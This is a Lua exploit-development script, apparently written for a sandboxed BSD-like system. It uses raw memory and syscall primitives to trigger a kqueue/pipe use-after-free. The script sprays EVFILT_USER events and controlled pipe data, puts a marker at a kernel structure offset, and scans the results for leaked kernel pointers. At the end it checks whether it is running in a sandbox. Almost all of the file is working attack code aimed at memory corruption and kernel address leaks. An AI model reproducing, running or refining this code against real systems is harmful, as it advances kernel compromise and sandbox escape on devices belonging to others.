--[[
    uaf_data_only_v2.lua
    UAF data-only - v2 using S.resolve for proper kevent calls
]]

local mem = rawget(_G, "memory")
local nat = rawget(_G, "native")
local S = rawget(_G, "syscall")

-- Resolve all needed syscalls properly
S.resolve({
    kqueue = 362, kevent = 363, pipe = 42, close = 6,
    write = 4, read = 3, getpid = 20, exit = 1
})

local EVFILT_READ = 0xFFFF
local EVFILT_USER = 0xFFF9
local EV_ADD     = 0x0001
local EV_ENABLE  = 0x0004
local EV_CLEAR   = 0x0020
local EV_DELETE  = 0x0002
local NOTE_TRIGGER = 0x80000000

local function tonn(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v or 0)) or 0
end

local function mkkev(filter, ident, flags, fflags, data, udata)
    local ev = mem.alloc(32)
    mem.write_qword(ev + 0, ident or 0)
    mem.write_word(ev + 8, filter)
    mem.write_word(ev + 10, flags or 0)
    mem.write_dword(ev + 12, fflags or 0)
    mem.write_qword(ev + 16, data or 0)
    mem.write_qword(ev + 24, udata or 0)
    return ev
end

local function parse_kev(buf, idx)
    local off = idx * 32
    return {
        ident  = tonn(mem.read_qword(buf + off)),
        filter = tonn(mem.read_word(buf + off + 8)),
        flags  = tonn(mem.read_word(buf + off + 10)),
        fflags = tonn(mem.read_dword(buf + off + 12)),
        data   = tonn(mem.read_qword(buf + off + 16)),
        udata  = tonn(mem.read_qword(buf + off + 24)),
    }
end

local function is_kptr(v)
    return v > 0xFFFF000000000000
end

-- Wrapper to convert S.kevent return from {h,l} to number
local function kevent(...)
    return tonn(S.kevent(...))
end

print("[+] UAF Data-Only v2 - Proper S.kevent\n")

-- Phase 0: Sanity check - basic kqueue + EVFILT_USER trigger
print("[*] Phase 0: Sanity check - EVFILT_USER trigger\n")

local kq0 = tonn(S.kqueue())
print("[+] kqueue = " .. kq0)

local uev0 = mkkev(EVFILT_USER, 0xDEAD, EV_ADD + EV_ENABLE, 0, 0, 0xCAFE)
local r0 = kevent(kq0, uev0, 1, nil, 0, 0)
print("[+] Register EVFILT_USER: " .. (r0 or "nil"))

-- Trigger the event
local tev0 = mkkev(EVFILT_USER, 0xDEAD, EV_ADD + EV_ENABLE, NOTE_TRIGGER, 0, 0xCAFE)
local r0t = kevent(kq0, tev0, 1, nil, 0, 0)
print("[+] Trigger EVFILT_USER: " .. (r0t or "nil"))

-- Read events
local out0 = mem.alloc(32)
local ne0 = kevent(kq0, nil, 0, out0, 1, 0)
print("[+] Read events: " .. (ne0 or "nil"))

if ne0 and ne0 > 0 then
    local kev = parse_kev(out0, 0)
    print(string.format("  ident=0x%x filter=%d fflags=0x%x data=%d udata=0x%x",
        kev.ident, kev.filter, kev.fflags, kev.data, kev.udata))
    if kev.ident == 0xDEAD then
        print("[+] EVFILT_USER works correctly!")
    end
end

-- Phase 1: UAF + EVFILT_USER with trigger
print("\n[*] Phase 1: UAF + EVFILT_USER trigger spray\n")

for round = 1, 3 do
    print(string.format("[%d/3] ---", round))
    
    local kq = tonn(S.kqueue())
    local pbuf = mem.alloc(16)
    S.pipe(pbuf)
    local rd = tonn(mem.read_dword(pbuf))
    local wr = tonn(mem.read_dword(pbuf + 4))
    
    -- Register EVFILT_READ
    local ev = mkkev(EVFILT_READ, rd, EV_ADD + EV_ENABLE, 0, 0, 0)
    kevent(kq, ev, 1, nil, 0, 0)
    
    -- Spray EVFILT_USER (pre)
    for i = 1, 50 do
        local uev = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, 0, 0, i)
        kevent(kq, uev, 1, nil, 0, 0)
    end
    
    -- Close pipe
    S.close(rd)
    S.close(wr)
    
    -- Spray EVFILT_USER (post)
    for i = 51, 100 do
        local uev = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, 0, 0, i)
        kevent(kq, uev, 1, nil, 0, 0)
    end
    
    -- Trigger ALL EVFILT_USER events
    for i = 1, 100 do
        local tev = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, NOTE_TRIGGER, 0, 0)
        kevent(kq, tev, 1, nil, 0, 0)
    end
    
    -- Read events
    local out = mem.alloc(3200)
    local ne = kevent(kq, nil, 0, out, 100, 0)
    
    if ne and ne > 0 then
        local kps = 0
        for i = 0, ne - 1 do
            local kev = parse_kev(out, i)
            if is_kptr(kev.ident) then
                if kps == 0 then print(string.format("  [!] KERNEL PTRS found in round %d:", round)) end
                print(string.format("    [%d] ident=0x%x data=%d udata=0x%x", i, kev.ident, kev.data, kev.udata))
                kps = kps + 1
            end
        end
        if kps == 0 then
            print(string.format("  Round %d: %d events, 0 kernel ptrs", round, ne))
        end
    else
        print(string.format("  Round %d: no events (ret=%s)", round, tostring(ne)))
    end
    
    kevent(kq, nil, 0, nil, 0, 0)  -- close kqueue via kevent
end

-- Phase 2: UAF + pipe data spray + EVFILT_USER trigger
print("\n[*] Phase 2: Pipe spray + UAF + trigger\n")

for round2 = 1, 3 do
    print(string.format("[2.%d/3]", round2))
    
    local kq2 = tonn(S.kqueue())
    local pbuf2 = mem.alloc(16)
    S.pipe(pbuf2)
    local rd2 = tonn(mem.read_dword(pbuf2))
    local wr2 = tonn(mem.read_dword(pbuf2 + 4))
    
    -- Write controlled data to pipe
    local sp = mem.alloc(128)
    for j = 0, 127 do
        mem.write_byte(sp + j, string.byte(string.format("%02x", j % 256), 1))
    end
    mem.write_qword(sp + 0x68, 0xBEEFBEEFBEEFBEEF)  -- marker at kn_fop offset
    S.write(wr2, sp, 128)
    
    -- Register EVFILT_READ
    local ev2 = mkkev(EVFILT_READ, rd2, EV_ADD + EV_ENABLE, 0, 0, 0)
    kevent(kq2, ev2, 1, nil, 0, 0)
    
    -- Close pipe (UAF)
    S.close(rd2)
    S.close(wr2)
    
    -- Spray EVFILT_USER
    for i = 1, 100 do
        local uev2 = mkkev(EVFILT_USER, 0xBEEF + i, EV_ADD + EV_ENABLE, 0, 0, 0)
        kevent(kq2, uev2, 1, nil, 0, 0)
    end
    
    -- Trigger all
    for i = 1, 100 do
        local tev2 = mkkev(EVFILT_USER, 0xBEEF + i, EV_ADD + EV_ENABLE, NOTE_TRIGGER, 0, 0)
        kevent(kq2, tev2, 1, nil, 0, 0)
    end
    
    -- Read events
    local out2 = mem.alloc(3200)
    local ne2 = kevent(kq2, nil, 0, out2, 100, 0)
    
    if ne2 and ne2 > 0 then
        local kps = 0
        for i = 0, ne2 - 1 do
            local kev = parse_kev(out2, i)
            if is_kptr(kev.ident) or kev.udata == 0xBEEFBEEFBEEFBEEF or kev.ident == 0xBEEFBEEFBEEFBEEF then
                if kps == 0 then print(string.format("  [!] Interesting data in round %d:", round2)) end
                print(string.format("    [%d] ident=0x%x udata=0x%x data=0x%x", i, kev.ident, kev.udata, kev.data))
                kps = kps + 1
            end
        end
        if kps == 0 then
            print(string.format("  Round %d: %d events, clean", round2, ne2))
        end
    else
        print(string.format("  Round %d: no events", round2))
    end
    
    kevent(kq2, nil, 0, nil, 0, 0)
end

-- Phase 3: Trigger EVFILT_USER without EVFILT_READ UAF
-- Pure EVFILT_USER spray to see if any kernel data leaks
print("\n[*] Phase 3: Pure EVFILT_USER kernel ptr scan\n")

local kq3 = tonn(S.kqueue())
for i = 1, 200 do
    local uev3 = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, 0, 0, 0)
    kevent(kq3, uev3, 1, nil, 0, 0)
end

-- Trigger all
for i = 1, 200 do
    local tev3 = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, NOTE_TRIGGER, 0, 0)
    kevent(kq3, tev3, 1, nil, 0, 0)
end

local out3 = mem.alloc(6400)
local ne3 = kevent(kq3, nil, 0, out3, 200, 0)

if ne3 and ne3 > 0 then
    print(string.format("[+] Got %d events", ne3))
    local kps = 0
    for i = 0, ne3 - 1 do
        local kev = parse_kev(out3, i)
        if is_kptr(kev.ident) or is_kptr(kev.udata) then
            if kps == 0 then print("  [!] Kernel pointers in EVFILT_USER:") end
            print(string.format("  [%d] ident=0x%x udata=0x%x", i, kev.ident, kev.udata))
            kps = kps + 1
        end
    end
    if kps == 0 then
        print("[-] No kernel pointers in EVFILT_USER")
    end
    -- Show first 5 events for inspection
    print("  First 5 events:")
    for i = 0, 4 do
        local kev = parse_kev(out3, i)
        print(string.format("  [%d] ident=%-8d fflags=0x%x data=%-4d udata=0x%x",
            i, kev.ident, kev.fflags, kev.data, kev.udata))
    end
else
    print("[-] No events from EVFILT_USER (trigger problem?)")
end

kevent(kq3, nil, 0, nil, 0, 0)

-- Check sandbox
local sb = rawget(_G, "is_in_sandbox")
if sb then
    print("\n[+] is_in_sandbox() = " .. tonn(sb()))
end

print("\n[+] All tests complete")
